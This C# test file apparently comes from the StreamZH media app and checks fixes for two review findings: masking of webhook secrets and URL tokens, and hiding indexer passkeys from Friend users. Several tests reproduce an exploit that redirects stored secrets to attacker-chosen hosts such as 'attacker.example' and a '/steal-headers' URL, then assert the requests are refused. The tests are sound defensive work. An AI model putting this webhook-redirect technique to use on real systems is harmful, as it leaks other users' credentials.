// StreamZH - one app for your whole media pipeline.
// Copyright (c) 2026 The StreamZH Authors.
// SPDX-License-Identifier: GPL-3.0-only

using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Dapper;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.AspNetCore.TestHost;
using Microsoft.Extensions.DependencyInjection;
using StreamZH.Core.Indexers;
using StreamZH.Core.Users;
using StreamZH.Data;
using StreamZH.Library.Notifications;
using StreamZH.Tests.Connect;
using StreamZH.Tests.Library;

namespace StreamZH.Tests.Host;

/// <summary>
/// 0.12, second verification (SV2): N-04 (webhook headers and URL tokens are secrets) and N-07 (indexer credentials are
/// not shown to Friends). Each test reproduces the reviewer's exploit.
/// </summary>
public sealed class SecondVerificationTests : IAsyncLifetime
{
    private const string Mask = "********";
    private readonly StreamZhFactory _factory = new(new FakeTmdbClient());
    private readonly FakeHttp _connectHttp = new();
    private readonly StubIndexerClient _indexerClient = new();
    private WebApplicationFactory<Program> _app = null!;
    private HttpClient _owner = null!;

    public async Task InitializeAsync()
    {
        _app = _factory.WithWebHostBuilder(builder => builder.ConfigureTestServices(services =>
        {
            services.AddHttpClient(ConnectHttp.ClientName).ConfigurePrimaryHttpMessageHandler(() => _connectHttp);
            services.AddSingleton(new ConnectOptions([TimeSpan.FromMilliseconds(1)]));
            services.AddSingleton<IIndexerClient>(_indexerClient);
        }));
        _owner = _app.CreateClient();
        (await _owner.PostAsJsonAsync("/api/v1/auth/setup", new { username = StreamZhFactory.OwnerName, password = StreamZhFactory.OwnerPassword })).EnsureSuccessStatusCode();
    }

    public async Task DisposeAsync()
    {
        await _app.DisposeAsync();
        await _factory.DisposeAsync();
    }

    private async Task<HttpClient> UserAsync(string name, UserRole role)
    {
        const string password = "a long test password";
        var passwords = _app.Services.GetRequiredService<StreamZH.Host.Auth.PasswordService>();
        _app.Services.GetRequiredService<UserRepository>().Create(name, passwords.Hash(password), role);
        var client = _app.CreateClient();
        (await client.PostAsJsonAsync("/api/v1/auth/login", new { username = name, password })).EnsureSuccessStatusCode();
        return client;
    }

    private static async Task<int> IdAsync(HttpResponseMessage response)
    {
        Assert.True(response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync());
        return (await response.Content.ReadFromJsonAsync<JsonElement>()).GetProperty("id").GetInt32();
    }

    private static async Task<string> ErrorAsync(HttpResponseMessage response, string field)
    {
        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        return (await response.Content.ReadFromJsonAsync<JsonElement>()).GetProperty("errors").GetProperty(field)[0].GetString()!;
    }

    private string RawConnections()
    {
        using var connection = _app.Services.GetRequiredService<Database>().Open();
        return string.Join("\n", connection.Query<string>("SELECT Settings FROM Connections"));
    }

    private static object Hook(int id, object settings, string name = "Home Assistant") => new { id, name, implementation = "webhook", onGrab = true, settings };

    /// <summary>
    /// N-04, the exploit: the owner put "Authorization: Bearer …" into the webhook headers; an Admin read it in clear and
    /// had it sent to a URL of their choice by testing with a changed URL.
    /// </summary>
    [Fact]
    public async Task Webhook_headers_are_masked_encrypted_and_not_sent_to_a_changed_url()
    {
        var admin = await UserAsync("admin", UserRole.Admin);
        var id = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/connection", Hook(0, new { url = "https://ha.example/api/webhook/streamzh", headers = "Authorization: Bearer HdrSecret123" })));

        var shown = await admin.GetStringAsync($"/api/v1/connection/{id}");
        Assert.DoesNotContain("HdrSecret123", shown, StringComparison.Ordinal);
        Assert.Contains($"\"headers\":\"{Mask}\"", shown, StringComparison.Ordinal);
        Assert.DoesNotContain("HdrSecret123", RawConnections(), StringComparison.Ordinal);

        // A changed URL with the headers left out or masked: refused, nothing is sent.
        Assert.Contains("again", await ErrorAsync(await admin.PostAsJsonAsync("/api/v1/connection/test", Hook(id, new { url = "http://127.0.0.1:7090/steal-headers", password = (string?)null })), "headers"), StringComparison.Ordinal);
        Assert.Contains("again", await ErrorAsync(await admin.PostAsJsonAsync("/api/v1/connection/test", Hook(id, new { url = "http://127.0.0.1:7090/steal-headers", headers = Mask })), "headers"), StringComparison.Ordinal);
        Assert.Contains("again", await ErrorAsync(await admin.PutAsJsonAsync($"/api/v1/connection/{id}", Hook(id, new { url = "https://attacker.example/x", headers = Mask })), "headers"), StringComparison.Ordinal);
        Assert.DoesNotContain(_connectHttp.Requests, r => r.Uri.Host is "127.0.0.1" or "attacker.example");

        // The same URL keeps the stored headers, and they still work.
        Assert.Equal(HttpStatusCode.OK, (await admin.PostAsJsonAsync("/api/v1/connection/test", Hook(id, new { url = "https://ha.example/api/webhook/streamzh", headers = Mask }))).StatusCode);
        Assert.Equal("Bearer HdrSecret123", _connectHttp.Last.Header("Authorization"));
    }

    /// <summary>N-04: a token or password inside a URL (query parameter or user info) is a secret too.</summary>
    [Fact]
    public async Task Credentials_in_a_url_are_masked_and_kept_only_unchanged()
    {
        var admin = await UserAsync("admin", UserRole.Admin);
        const string url = "https://hooks.example/notify?token=UrlSecret456&format=json";
        var id = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/connection", Hook(0, new { url })));

        var shown = (await admin.GetFromJsonAsync<JsonElement>($"/api/v1/connection/{id}")).GetProperty("settings").GetProperty("url").GetString();
        Assert.Equal($"https://hooks.example/notify?token={Mask}&format=json", shown);
        Assert.DoesNotContain("UrlSecret456", RawConnections(), StringComparison.Ordinal);

        // Sent back unchanged: the stored URL stays. Masked but elsewhere: refused.
        Assert.Equal(HttpStatusCode.OK, (await admin.PutAsJsonAsync($"/api/v1/connection/{id}", Hook(id, new { url = shown }))).StatusCode);
        Assert.Equal(url, new ConnectionSettings(_app.Services.GetRequiredService<ConnectionRepository>().Find(id)!.Settings).Text("url"));
        Assert.Contains("again", await ErrorAsync(await admin.PostAsJsonAsync("/api/v1/connection/test", Hook(id, new { url = $"https://attacker.example/notify?token={Mask}&format=json" })), "url"), StringComparison.Ordinal);
        Assert.DoesNotContain(_connectHttp.Requests, r => r.Uri.Host == "attacker.example");

        var basic = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/connection", Hook(0, new { url = "https://user:UserInfoPw@hooks.example/x" }, "Basic hook")));
        Assert.Equal($"https://{Mask}@hooks.example/x", (await admin.GetFromJsonAsync<JsonElement>($"/api/v1/connection/{basic}")).GetProperty("settings").GetProperty("url").GetString());
    }

    /// <summary>N-07: Friends read the indexer list (search pages) but not a passkey in the extra parameters or a key in the URL.</summary>
    [Fact]
    public async Task Friends_do_not_see_indexer_credentials()
    {
        var friend = await UserAsync("friend", UserRole.Friend);
        var admin = await UserAsync("admin", UserRole.Admin);
        var id = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/indexer", new
        {
            name = "Tracker", implementation = "Torznab", baseUrl = "https://tracker.example/torznab", apiPath = "/api",
            apiKey = "stored-key", categories = new[] { 2000 }, tvCategories = new[] { 5040 }, priority = 25, additionalParameters = "&passkey=PassKey789",
        }));

        foreach (var path in new[] { "/api/v1/indexer", $"/api/v1/indexer/{id}", $"/api/v1/indexer/{id}/details" })
        {
            var body = await friend.GetStringAsync(path);
            Assert.DoesNotContain("PassKey789", body, StringComparison.Ordinal);
            Assert.DoesNotContain("stored-key", body, StringComparison.Ordinal);
        }

        Assert.Contains("PassKey789", await admin.GetStringAsync($"/api/v1/indexer/{id}"), StringComparison.Ordinal);
    }
}
